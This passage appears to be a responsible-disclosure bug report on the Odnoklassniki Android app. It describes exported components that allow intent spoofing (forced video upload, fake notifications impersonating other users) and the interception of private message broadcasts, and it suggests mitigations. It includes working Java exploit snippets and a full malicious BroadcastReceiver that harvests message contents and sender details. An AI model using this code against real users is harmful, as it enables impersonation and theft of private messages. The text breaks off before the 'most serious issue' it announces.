    "vulnerability_information_html": "<p>Hello,</p>\n\n<p>I have recently found several critical vulnerabilities in Odnoklassniki Android application, which is one of your projects, thus I am reporting it here.</p>\n\n<p>The first vulnerability is so called Intent spoofing.<br>\nThe vulnerability lies in ability to start the video upload activity of Odnoklassniki application from inside a different application installed on the same device. This vulnerability happens when a component is made public and requires no special permission. A consequence of this may be that a malicious app sends an intent to a legitimate component (VideoUploadActivity), which will result in data injection or state change (in our case a user might be tricked into uploading content he normally would not upload to ok.ru network).</p>\n\n<p>The following code snippet demonstrates possible exploit code:</p>\n\n<p>Intent m = new Intent();<br>\nm.setClassName(&quot;ru.ok.android&quot;,&quot;ru.ok.android.ui.activity.StartVideoUploadActivity&quot;);<br>\nstartActivity(m);</p>\n\n<p>Staying with the intent spoofing vulnerability, there is one more case of this kind of vulnerability.<br>\nThis time a malicious application is able to send fake Notifications to user about literally any happening or action in Odnoklassniki. User can be tricked this way to do action he did not intend to again. A malicious app might send fake private messages to the victim user, impersonating other users! The user can be misinformed about a comment on his photo or a response in any of groups he belongs to! The origin of this vulnerability is just as the former one, action is made public in the application and it does not require the calling application to have any kind of permission to do so.<br>\nThis vulnerability originates from class ok.ru.android.services.app.NotifyReceiver</p>\n\n<p>Possible fix to this? Explicitly set the value of android:exported to false or make use of permissions.</p>\n\n<p>A short code snippet demonstrating possible exploitation:</p>\n\n<p>Intent u = new Intent();<br>\nu.setAction(&quot;ru.ok.android.action.NOTIFY&quot;);<br>\nu.putExtra(&quot;key&quot;, &quot;d-147298617&quot;);<br>\nu.putExtra(&quot;message&quot;, &quot;Hello there! This is a fake message. You have been tricked.&quot;);</p>\n\n<p>//u.putExtra(&quot;conversation_id&quot;, &quot;&quot;);<br>\n//u.putExtra(&quot;mediatopic_id&quot;, &quot;413434225584&quot;);</p>\n\n<p>u.putExtra(&quot;dsc_id&quot;, &quot;612470493988:USER_PHOTO&quot;);</p>\n\n<p>getActivity().sendBroadcast(u);</p>\n\n<p>Another vulnerability that I have found is Unauthorized intent receipt, in this certain case it is unauthorized notification (message) receipt. Knowing this vulnerability a potential attacking application is able to intercept private messages, updates, photo comments, post comments, etc. sent to the user. The cause of this vulnerability lies in AndroidManifest.xml. The receipt of a notification (message) should be protected from intercepting with proper permission requirement. Possible mitigation - Do not use implicit intents for communication between the components of a single app or require the target application to have a proper permission acquired.</p>\n\n<p>Here I am enclosing a complete malicious receiver code snippet, which is able to intercept all &quot;messages&quot; shown to the user as a notification. Please note, that the malicious application is able to see not only the message but the userId of the user who sent it and many other sensitive details.</p>\n\n<p>public class MaliciousReceiver extends BroadcastReceiver {<br>\n<a href=\"/override\">@Override</a><br>\npublic void onReceive(Context context, Intent intent) {<br>\n    if (&quot;ru.ok.android.action.NOTIFY&quot;.equals(intent.getAction())) {</p>\n<pre class=\"highlight plaintext\"><code>    Bundle localBundle = intent.getExtras();\n    if (localBundle != null) {\n        String str1 = localBundle.getString(&quot;key&quot;);\n        String str2 = localBundle.getString(&quot;message&quot;);\n        String str3 = localBundle.getString(&quot;cid&quot;);\n        if (str3 != null) {\n            String str4 = localBundle.getString(&quot;caller_name&quot;);\n            String str5 = localBundle.getString(&quot;server&quot;);\n            return;\n        }\n\n        String str4 = localBundle.getString(&quot;nconversation_id&quot;);\n        String str5 = localBundle.getString(&quot;dsc_id&quot;);\n\n        Toast.makeText(context, &quot;key:&quot; + str1 + &quot;\\nmessage: &quot; + str2 + &quot;\\ncid: &quot; + str3 + &quot;\\nconversation_id: &quot; + str4 + &quot;\\ndsc_id: &quot; + str5, Toast.LENGTH_SHORT).show();\n    }\n}\n</code></pre>\n<p>}</p>\n\n<p>}</p>\n\n<p>And here comes the most serious issue.
